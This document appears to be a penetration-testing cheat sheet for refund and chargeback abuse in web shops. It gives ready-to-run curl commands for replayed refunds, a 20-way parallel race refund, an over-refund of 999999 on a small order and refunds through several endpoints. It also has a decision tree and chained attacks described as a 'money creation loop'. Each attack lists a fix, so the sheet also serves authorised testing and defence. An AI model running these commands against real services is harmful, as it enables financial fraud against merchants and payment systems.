# REFUND / CHARGEBACK ABUSE — EXECUTION

| Attack | Signal | Test | Confirm | Kill |
|--------|--------|------|---------|------|
| **Replay Refund** | refund/order endpoint | `curl -X POST /orders/1/refund -d '{}'` ×2 sequentially | Both 200, refund credited twice | "already refunded" |
| **Race Refund** | refund without idempotency | `for i in {1..20}; do curl -X POST /orders/1/refund &; done; wait` | N× refund credited | DB unique constraint |
| **Over-refund** | amount in request body | `curl -X POST /orders/1/refund -d '{"amount":9999}'` on $10 order | $9999 refunded | Server caps to order total |
| **Partial Sum** | partial_refund allowed | `curl /refund -d '{"amount":5}'` ×3 on $10 order | Total refunded = $15 | Sum capped at order total |
| **Cross-endpoint** | Multiple refund handlers | Web refund + Mobile refund + Support API refund on same order | Refunded 3× | Shared lock across endpoints |
| **Cancel-and-keep** | subscription cancel | Cancel subscription + request refund for unused period + still access premium | Premium active + money back | Access revoked on cancel |

## CURL COMMANDS
```bash
# Race refund (20 parallel)
for i in {1..20}; do
  (curl -s -X POST /api/orders/ORD-123/refund \
    -H "Cookie: SESSION_A" \
    -H "Content-Type: application/json" \
    -d '{}' &>/dev/null) &
done; wait

# Check actual ledger (not just HTTP response)
curl -s -X GET /api/wallet/transactions -H "Cookie: A" | jq '.data[] | select(.type=="refund") | .amount'

# Over-refund attempt
curl -v -X POST /api/orders/ORD-123/refund \
  -H "Cookie: A" \
  -d '{"amount":999999}'

# Cross-endpoint refund (different paths, same order)
curl -X POST /api/orders/ORD-123/refund -H "Cookie: A"        # Web
curl -X POST /api/v2/refund -d '{"order_id":"ORD-123"}' -H "Cookie: A"  # Mobile
curl -X POST /api/support/refund -d '{"order":"ORD-123"}' -H "Cookie: A" # Support
```

## DECISION TREE
```
Found refund endpoint?
├─ Refund replayable (same request 2×)?
│  ├─ Second 200 → REFUND REPLAY (check: does money actually move twice?)
│  └─ Second 400 → idempotent
├─ Refund race parallel?
│  ├─ Multiple 200s → RACE REFUND (check actual ledger, not just HTTP)
│  └─ Single 200 + rest errors → unique constraint works
├─ Refund amount in body?
│  ├─ Amount > order total accepted → OVER-REFUND
│  ├─ Partial refunds sum > total → PARTIAL SUM ABUSE
│  └─ Server calculates amount → safe
└─ Multiple refund endpoints for same order?
   ├─ All succeed → CROSS-ENDPOINT REFUND
   └─ Shared lock → safe
```

## CHAIN
Refund Race + Subscription Abuse = Cancel subscription + get refund + keep premium
Over-refund + Wallet Manipulation = Money creation loop
